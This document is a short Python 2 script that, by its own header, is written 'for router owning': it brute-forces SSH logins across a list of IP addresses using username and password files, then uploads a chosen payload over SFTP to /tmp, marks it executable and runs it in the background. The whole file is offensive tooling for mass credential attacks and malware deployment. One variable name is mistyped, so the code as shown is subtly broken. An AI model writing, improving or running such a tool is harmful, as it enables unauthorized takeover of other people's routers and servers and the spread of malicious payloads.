#!/usr/bin/python
# SSH bruteforce with upload/exec over SFTP
# Based on securitytube stuff, wrote for router owning
import paramiko
import sys

def AttackSSH(ipAddress, userFile, passFile, payload):
    print "[+] Attacking Host : %s " %(ipAddress)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for line in open(userFile, "r").readlines():
        username = line.strip()
        for line in open(passfile, "r").readlines():
            password = line.strip()
            try:
                print "[+] Trying username: %s password: %s " %(username, password)
                ssh.connect(ipAddress, username=username, password=password)
            except paramiko.AuthenticationException:
                print "[-] Failed! ..."
                continue # we could exit, but thats not a brute force, is it? 
            print "[+] Success ... username: %s and password %s is VALID! " %(username, password)
            print "[+] Deploying %s" %(payload)
            uploadExec(ipAddress, username, password, payload)

def uploadExec(ipAddress, username, password, payload):
    try:
        ssh = paramiko.SSHClient()
        print "[*] Started SSH client..."
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print "[*] Set host key policy..."
        ssh.connect(ipAddress, username=username, password=password)
        print "[*] Connection Established..."
        print "[*] Opening SFTP"
        sftpClient = ssh.open_sftp()
        print "[*] Uploading..."
        sftpClient.put(payload, "/tmp/" +payload)
        print "[*] chmod..."
        ssh.exec_command("chmod a+x /tmp/" +payload)
        print "[*] Execute!"
        ssh.exec_command("nohup /tmp/" +payload+ " &")
        print "[+] Done!"
    except Exception, e:
        print "[-] Fail, printing exception for debug purpose"
        print e

if __name__ == "__main__":
    if len(sys.argv) != 5:
        sys.exit("Usage: %s <iplist.lst> <usernames.lst> <passwords.lst> <payload>" %(sys.argv[0]))
    else:
        for line in open(sys.argv[1], "r").readlines():
            ip = line.strip()
            AttackSSH(ip, sys.argv[2], sys.argv[3], sys.argv[4])
